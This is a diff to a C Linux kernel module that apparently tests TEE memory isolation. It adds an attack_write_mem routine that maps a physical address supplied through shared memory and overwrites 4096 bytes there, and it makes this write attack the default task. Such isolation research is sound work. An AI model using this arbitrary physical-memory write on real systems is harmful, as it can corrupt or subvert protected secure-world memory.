@@ -12,6 +12,7 @@ static u8 waiting = 0;
 
 void ping_app(void);
 void attack_read_mem(void);
+void attack_write_mem(void);
 
 static void tee_poll_timer_handler(struct timer_list *timer)
 {
@@ -23,7 +24,7 @@ static void tee_poll_timer_handler(struct timer_list *timer)
 		case TEE_C_TEE_READY:
 			pr_info("%s: TEE ready, send command!\n", __FUNCTION__);
 			// For now we init the ping app
-			SHARED_MEM_PTR->task_id = TEE_T_ATTACK_READ_MEM;
+			SHARED_MEM_PTR->task_id = TEE_T_ATTACK_WRITE_MEM;
 			SHARED_MEM_PTR->status = TEE_C_HOSTSEND;
 			waiting = 0;
 			break;
@@ -36,6 +37,9 @@ static void tee_poll_timer_handler(struct timer_list *timer)
 					break;
 				case TEE_T_ATTACK_READ_MEM:
 					attack_read_mem();
+					break;
+				case TEE_T_ATTACK_WRITE_MEM:
+					attack_write_mem();
 					break;
 				case TEE_T_UNKNOWN:
 				default:
@@ -107,6 +111,35 @@ void attack_read_mem(void) {
 		}
 		++SHARED_MEM_PTR->memory[1];
 		SHARED_MEM_PTR->task_id = TEE_T_ATTACK_READ_MEM;
+		SHARED_MEM_PTR->status = TEE_C_HOSTSEND;
+	} else {
+		pr_info("Done! Reached ping count %u", SHARED_MEM_PTR->memory[0]);
+		SHARED_MEM_PTR->task_id = TEE_T_UNKNOWN;
+		SHARED_MEM_PTR->status = TEE_C_NONE;
+	}
+}
+
+void attack_write_mem(void) {
+	const u8 number_of_read_attempts = 5;
+	u64 address = 0;
+	u64 secret_mem_size = 4096;
+	// We simply use the first byte of the payload to count the pings
+	// Vector not yet initalized
+	if (0 == SHARED_MEM_PTR->memory[0]) { return; }
+	// The memory was initialized, we read
+	if (number_of_read_attempts > SHARED_MEM_PTR->memory[1]) {
+		void __iomem * secret_mem = NULL;
+		// The 8 bytes beginning at memory SHARED_MEM_PTR->memory[2] denote a 
+		// 64 bit physical memory addresss 
+		address = *((u64*) &(SHARED_MEM_PTR->memory[2]));
+		pr_info("Test 0x%016llx", address);
+		secret_mem = ioremap(address, secret_mem_size);
+		for (u64 offset = 0; offset < secret_mem_size; offset+=4) {
+			iowrite32(SHARED_MEM_PTR->memory[1] + offset, secret_mem + offset);
+			ioread32(secret_mem + offset);
+		}
+		++SHARED_MEM_PTR->memory[1];
+		SHARED_MEM_PTR->task_id = TEE_T_ATTACK_WRITE_MEM;
 		SHARED_MEM_PTR->status = TEE_C_HOSTSEND;
 	} else {
 		pr_info("Done! Reached ping count %u", SHARED_MEM_PTR->memory[0]);
